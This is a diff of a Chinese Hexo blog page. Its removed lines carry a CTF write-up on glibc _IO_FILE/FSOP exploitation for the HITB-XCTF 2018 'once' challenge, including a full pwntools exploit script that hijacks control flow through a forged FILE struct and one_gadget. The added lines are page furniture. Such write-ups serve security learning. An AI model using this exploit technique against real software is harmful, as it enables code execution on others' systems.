@@ -8,16 +8,38 @@
   <link rel="dns-prefetch" href="http://GD.com">
   <title>Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="a GOOD pwner">
-<meta property="og:type" content="website">
+  <meta name="description" content="鹏城杯线下总结原文首发自安全客前言这次鹏城杯线下槽点很多，但是主要原因还是自己TCL。。这里我就选了比较简单的两题详细讲一下解题思路，如讲得不对，欢迎大佬指正。 shotshot这题的泄露地址很容易，有个格式化字符串漏洞和变量未初始化，这两个都可以用来泄露地址，难点是后面有个任意地址写的漏洞怎么利用，自己先调试了好久，后来一航师傅写出脚本后我看了一眼才恍然大悟，师傅太强了，mark。 1、查看保护">
+<meta property="og:type" content="article">
 <meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://GD.com/index.html">
+<meta property="og:url" content="http://GD.com/2018/12/12/pcb/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="a GOOD pwner">
+<meta property="og:description" content="鹏城杯线下总结原文首发自安全客前言这次鹏城杯线下槽点很多，但是主要原因还是自己TCL。。这里我就选了比较简单的两题详细讲一下解题思路，如讲得不对，欢迎大佬指正。 shotshot这题的泄露地址很容易，有个格式化字符串漏洞和变量未初始化，这两个都可以用来泄露地址，难点是后面有个任意地址写的漏洞怎么利用，自己先调试了好久，后来一航师傅写出脚本后我看了一眼才恍然大悟，师傅太强了，mark。 1、查看保护">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://gd.com/2018/12/12/pcb/1.jpg">
+<meta property="og:image" content="http://gd.com/2018/12/12/pcb/2.jpg">
+<meta property="og:image" content="http://gd.com/2018/12/12/pcb/3.png">
+<meta property="og:image" content="http://gd.com/2018/12/12/pcb/4.jpg">
+<meta property="og:image" content="http://gd.com/2018/12/12/pcb/5.jpg">
+<meta property="og:image" content="http://gd.com/2018/12/12/pcb/6.jpg">
+<meta property="og:image" content="http://gd.com/2018/12/12/pcb/7.jpg">
+<meta property="og:image" content="http://gd.com/2018/12/12/pcb/8.jpg">
+<meta property="og:image" content="http://gd.com/2018/12/12/pcb/9.jpg">
+<meta property="og:image" content="http://gd.com/2018/12/12/pcb/10.jpg">
+<meta property="og:image" content="http://gd.com/2018/12/12/pcb/11.jpg">
+<meta property="og:image" content="http://gd.com/2018/12/12/pcb/12.jpg">
+<meta property="og:image" content="http://gd.com/2018/12/12/pcb/121.jpg">
+<meta property="og:image" content="http://gd.com/2018/12/12/pcb/122.jpg">
+<meta property="og:image" content="http://gd.com/2018/12/12/pcb/123.jpg">
+<meta property="og:image" content="http://gd.com/2018/12/12/pcb/124.jpg">
+<meta property="og:image" content="http://gd.com/2018/12/12/pcb/125.jpg">
+<meta property="og:image" content="http://gd.com/2018/12/12/pcb/126.jpg">
+<meta property="og:image" content="http://gd.com/2018/12/12/pcb/127.jpg">
+<meta property="og:image" content="http://gd.com/2018/12/12/pcb/128.jpg">
+<meta property="og:updated_time" content="2018-12-13T00:18:57.784Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Hexo">
-<meta name="twitter:description" content="a GOOD pwner">
+<meta name="twitter:description" content="鹏城杯线下总结原文首发自安全客前言这次鹏城杯线下槽点很多，但是主要原因还是自己TCL。。这里我就选了比较简单的两题详细讲一下解题思路，如讲得不对，欢迎大佬指正。 shotshot这题的泄露地址很容易，有个格式化字符串漏洞和变量未初始化，这两个都可以用来泄露地址，难点是后面有个任意地址写的漏洞怎么利用，自己先调试了好久，后来一航师傅写出脚本后我看了一眼才恍然大悟，师傅太强了，mark。 1、查看保护">
+<meta name="twitter:image" content="http://gd.com/2018/12/12/pcb/1.jpg">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -153,9 +175,7 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-pcb" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-pcb" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
     <div class="article-entry" itemprop="articleBody">
@@ -215,6 +235,27 @@
       
 
       
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
     </div>
     <div class="article-info article-info-index">
       
@@ -222,16 +263,75 @@
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/12/12/pcb/">展开全文 >></a>
-        </p>
-      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://GD.com/2018/12/12/pcb/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+  
+    <a href="/2018/11/20/house/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title"></div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -251,363 +351,14 @@
 
 
 
-
   
-    <article id="post-house" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="通过一道pwn题探究-IO-FILE结构攻击利用"><a href="#通过一道pwn题探究-IO-FILE结构攻击利用" class="headerlink" title="通过一道pwn题探究_IO_FILE结构攻击利用"></a>通过一道pwn题探究_IO_FILE结构攻击利用</h1><h1 id="原文首发自安全客"><a href="#原文首发自安全客" class="headerlink" title="(原文首发自安全客)"></a>(原文首发自安全客)</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前一段时间学了IO-file的知识，发现在CTF中IO_file也是一个常考的知识点，这里我就来总结一下IO_file的知识点，顺便可以做一波笔记。首先讲一下IO_file的结构体，然后其利用的方法，最后通过一道HITB-XCTF 2018 GSEC once的题目来加深对IO_file的理解。</p>
-<h1 id="libc2-23-版本的IO-file利用"><a href="#libc2-23-版本的IO-file利用" class="headerlink" title="libc2.23 版本的IO_file利用"></a>libc2.23 版本的IO_file利用</h1><p>这是一种控制流劫持技术，攻击者可以利用程序中的漏洞覆盖file指针指向能够控制的区域，从而改写结构体中重要的数据，或者覆盖vtable来控制程序执行流。</p>
-<h2 id="IO-file结构体"><a href="#IO-file结构体" class="headerlink" title="IO_file结构体"></a>IO_file结构体</h2><p>在ctf中调用setvbuf()，stdin、stdout、stderr结构体一般位于libc数据段，其他大多数的FILE 结构体保存在堆上，其定义如下代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_FILE &#123;</span><br><span class="line">  int _flags;        /* High-order word is _IO_MAGIC; rest is flags. */</span><br><span class="line">#define _IO_file_flags _flags</span><br><span class="line"></span><br><span class="line">  /* The following pointers correspond to the C++ streambuf protocol. */</span><br><span class="line">  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span><br><span class="line">  char* _IO_read_ptr;    /* Current read pointer */</span><br><span class="line">  char* _IO_read_end;    /* End of get area. */</span><br><span class="line">  char* _IO_read_base;    /* Start of putback+get area. */</span><br><span class="line">  char* _IO_write_base;    /* Start of put area. */</span><br><span class="line">  char* _IO_write_ptr;    /* Current put pointer. */</span><br><span class="line">  char* _IO_write_end;    /* End of put area. */</span><br><span class="line">  char* _IO_buf_base;    /* Start of reserve area. */</span><br><span class="line">  char* _IO_buf_end;    /* End of reserve area. */</span><br><span class="line">  /* The following fields are used to support backing up and undo. */</span><br><span class="line">  char *_IO_save_base; /* Pointer to start of non-current get area. */</span><br><span class="line">  char *_IO_backup_base;  /* Pointer to first valid character of backup area */</span><br><span class="line">  char *_IO_save_end; /* Pointer to end of non-current get area. */</span><br><span class="line"></span><br><span class="line">  struct _IO_marker *_markers;</span><br><span class="line"></span><br><span class="line">  struct _IO_FILE *_chain;</span><br><span class="line"></span><br><span class="line">  int _fileno;</span><br><span class="line">#if 0</span><br><span class="line">  int _blksize;</span><br><span class="line">#else</span><br><span class="line">  int _flags2;</span><br><span class="line">#endif</span><br><span class="line">  _IO_off_t _old_offset; /* This used to be _offset but it&apos;s too small.  */</span><br><span class="line"></span><br><span class="line">#define __HAVE_COLUMN /* temporary */</span><br><span class="line">  /* 1+column number of pbase(); 0 is unknown. */</span><br><span class="line">  unsigned short _cur_column;</span><br><span class="line">  signed char _vtable_offset;</span><br><span class="line">  char _shortbuf[1];</span><br><span class="line"></span><br><span class="line">  /*  char* _save_gptr;  char* _save_egptr; */</span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line">#ifdef _IO_USE_OLD_IO_FILE</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<p>FILE结构体会通过struct _IO_FILE *_chain链接成一个链表，64位程序下其偏移为0x60，链表头部用_IO_list_all指针表示。如下图所示</p>
-<p><img src="/2018/11/20/house/2.png" alt="2"></p>
-<p>IO_file结构体外面还被一个IO_FILE_plus结构体包裹着，其定义如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_FILE_plus</span><br><span class="line">&#123;</span><br><span class="line">    _IO_FILE    file;</span><br><span class="line">    IO_jump_t   *vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>其中包含了一个重要的虚表*vtable，它是IO_jump_t 类型的指针,偏移是0xd8，保存了一些重要的函数指针，我们一般就是改这里的指针来控制程序执行流。其定义如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_jump_t</span><br><span class="line">&#123;</span><br><span class="line">    JUMP_FIELD(size_t, __dummy);</span><br><span class="line">    JUMP_FIELD(size_t, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    /* showmany */</span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">#if 0</span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line">#endif</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<h2 id="利用方法（FSOP）"><a href="#利用方法（FSOP）" class="headerlink" title="利用方法（FSOP）"></a>利用方法（FSOP）</h2><p>这是利用程序中的漏洞（如unsorted bin attack）来覆盖_IO_list_all(全局变量)来使链表指向一个我们能够控制的区域，从而改写虚表*vtable。通过调用  _IO_flush_all_lockp()函数来触发,，该函数会在下面三种情况下被调用：</p>
-<p>1：当 libc 执行 abort 流程时。</p>
-<p>2：当执行 exit 函数时。当执行流从 main 函数返回时</p>
-<p>3：当执行流从 main 函数返回时</p>
-<p>当 glibc 检测到内存错误时，会依次调用这样的函数路径：malloc_printerr -&gt;</p>
-<p><strong> </strong>libc_message-&gt;__GI_abort -&gt; _IO_flush_all_lockp -&gt; _IO_OVERFLOW</p>
-<p>要让正常控制执行流，还需要伪造一些数据，我们看下代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)   </span><br><span class="line">#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="line">       || (_IO_vtable_offset (fp) == 0</span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">#endif</span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br></pre></td></tr></table></figure>
-<p>这时我们伪造 fp-&gt;_mode = 0，  fp-&gt;_IO_write_ptr &gt;  fp-&gt;_IO_write_base就可以通过验证</p>
-<h1 id="新版本下的利用"><a href="#新版本下的利用" class="headerlink" title="新版本下的利用"></a>新版本下的利用</h1><p>新版本（libc2.24以上）的防御机制会检查vtable的合法性，不能再像之前那样改vatable为堆地址，但是_IO_str_jumps是一个符合条件的  vtable，改  vtable为 _IO_str_jumps即可绕过检查。其定义如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">const struct _IO_jump_t _IO_str_jumps libio_vtable =</span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<p>其中 _IO_str_overflow 函数会调用   FILE+0xe0处的地址。这时只要我们将虚表覆盖为 _ IO_str_jumps将偏移0xe0处设置为one_gadget即可。</p>
-<p>还有一种就是利用io_finish函数，同上面的类似， io_finish会以   _IO_buf_base处的值为参数跳转至 FILE+0xe8处的地址。执行  fclose（ fp）时会调用此函数，但是大多数情况下可能不会有 fclose（fp），这时我们还是可以利用异常来调用 io_finish，异常时调用  _ IO_OVERFLOW</p>
-<p>是根据IO_str_overflow在虚表中的偏移找到的， 我们可以设置vtable为_IO_str_jumps-0x8异常时会调用io_finish函数。</p>
-<h1 id="具体题目（HITB-XCTF-2018-GSEC-once）"><a href="#具体题目（HITB-XCTF-2018-GSEC-once）" class="headerlink" title="具体题目（HITB-XCTF 2018 GSEC once）"></a>具体题目（HITB-XCTF 2018 GSEC once）</h1><h2 id="1、先简单运行一下程序，查看保护"><a href="#1、先简单运行一下程序，查看保护" class="headerlink" title="1、先简单运行一下程序，查看保护"></a>1、先简单运行一下程序，查看保护</h2><p>主要开启了CANARY和NX保护，不能改写GOT表</p>
-<p><img src="/2018/11/20/house/3.jpg" alt="3"></p>
-<p><img src="/2018/11/20/house/4.jpg" alt="4"></p>
-<h2 id="2、ida打开，反编译"><a href="#2、ida打开，反编译" class="headerlink" title="2、ida打开，反编译"></a>2、ida打开，反编译</h2><p>这里当输入一个不合法的选项时，就会输出puts的地址，用于泄露libc的基地址。</p>
-<p><img src="/2018/11/20/house/5.jpg" alt="5"></p>
-<p>第一个函数是创建一个chunk保存数据</p>
-<p><img src="/2018/11/20/house/6.jpg" alt="6"></p>
-<p><img src="/2018/11/20/house/7.jpg" alt="7"></p>
-<p>第二个函数和第三个函数只能执行一次，有个任意地址写漏洞，这时我们可以利用第二个函数改写off_202038+3d为_IO_list_all-0x10，然后分别执行第三和第一个函数，最后_IO_list_all就会指向0x555555757040的位置</p>
-<p><img src="/2018/11/20/house/8.jpg" alt="8"></p>
-<p><img src="/2018/11/20/house/9.jpg" alt="9"></p>
-<p>第四个函数主要是对堆块的操作，我们可以利用利用这个函数伪造一个_IO_FILE结构</p>
-<p><img src="/2018/11/20/house/10.jpg" alt="10"></p>
-<h2 id="3、具体过程"><a href="#3、具体过程" class="headerlink" title="3、具体过程"></a>3、具体过程</h2><p>1、泄露libc，输入一个“6”即可得到puts函数的地址，然后酸算出libc基地址</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">p.sendline(&apos;6&apos;)</span><br><span class="line">p.recvuntil(&apos;Invalid choice\n&apos;)</span><br><span class="line">ioputadd=int(p.recvuntil(&apos;&gt;&apos;,drop=True),16)</span><br><span class="line">print hex(ioputadd)</span><br><span class="line">libcbase=ioputadd-libc.symbols[&apos;_IO_puts&apos;]</span><br><span class="line">print hex(libcbase)</span><br><span class="line">one=libcbase+0x4526a</span><br></pre></td></tr></table></figure>
-<p>2、利用任意地址写改写_IO_list_all为堆的地址</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">p.sendline(&apos;2&apos;)</span><br><span class="line">ioall=libcbase+libc.symbols[&apos;_IO_list_all&apos;]-0x10</span><br><span class="line">print hex(ioall)</span><br><span class="line">payload=p64(ioall)*4</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">p.sendline(&apos;3&apos;)</span><br><span class="line">p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br></pre></td></tr></table></figure>
-<p> <img src="/2018/11/20/house/11.jpg" alt="11"></p>
-<p>3、这时只要我们再利用第四个函数伪造__IO_FILE结构体，改写vtable为_IO_str_jumps，file+0xe0设置</p>
-<p>为one_gadget</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(&apos;4&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;input size:\n&apos;)</span><br><span class="line">p.sendline(&apos;256&apos;)</span><br><span class="line"></span><br><span class="line">jump=libcbase+libc.symbols[&apos;_IO_file_jumps&apos;]+0xc0  #_IO_str_jumps</span><br><span class="line">p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">p.sendline(&apos;2&apos;)</span><br><span class="line">payload=&apos;\0&apos;*0xa8+p64(jump)+p64(one)</span><br><span class="line">payload+=&apos;\0&apos;*(0x100-len(payload))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">p.sendline(&apos;4&apos;)</span><br></pre></td></tr></table></figure>
-<p><img src="/2018/11/20/house/12.jpg" alt="12"></p>
-<p>4、输入“5”，执行exit()函数触发one_gadget</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">p.sendline(&apos;5&apos;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p><img src="/2018/11/20/house/13.jpg" alt="13"></p>
-<h1 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">#context.log_level=True</span><br><span class="line">p=process(&apos;./once&apos;)</span><br><span class="line">elf=ELF(&apos;once&apos;)</span><br><span class="line">libc=ELF(&apos;libc6_2.23-0ubuntu10_amd64.so&apos;)</span><br><span class="line">p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">p.sendline(&apos;6&apos;)</span><br><span class="line">p.recvuntil(&apos;Invalid choice\n&apos;)</span><br><span class="line">ioputadd=int(p.recvuntil(&apos;&gt;&apos;,drop=True),16)</span><br><span class="line">print hex(ioputadd)</span><br><span class="line">libcbase=ioputadd-libc.symbols[&apos;_IO_puts&apos;]</span><br><span class="line">print hex(libcbase)</span><br><span class="line">one=libcbase+0x4526a</span><br><span class="line"></span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">p.sendline(&apos;2&apos;)</span><br><span class="line">ioall=libcbase+libc.symbols[&apos;_IO_list_all&apos;]-0x10</span><br><span class="line">print hex(ioall)</span><br><span class="line">payload=p64(ioall)*4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">p.sendline(&apos;3&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">#</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line"></span><br><span class="line">p.sendline(&apos;4&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;input size:\n&apos;)</span><br><span class="line">p.sendline(&apos;256&apos;)</span><br><span class="line"></span><br><span class="line">jump=libcbase+libc.symbols[&apos;_IO_file_jumps&apos;]+0xc0 #_IO_str_jumps</span><br><span class="line">p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">p.sendline(&apos;2&apos;)</span><br><span class="line">payload=&apos;\0&apos;*0xa8+p64(jump)+p64(one)</span><br><span class="line">payload+=&apos;\0&apos;*(0x100-len(payload))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">p.sendline(&apos;4&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">raw_input()</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">p.sendline(&apos;5&apos;)</span><br><span class="line"></span><br><span class="line">p.interactive（）</span><br></pre></td></tr></table></figure>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/11/20/house/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
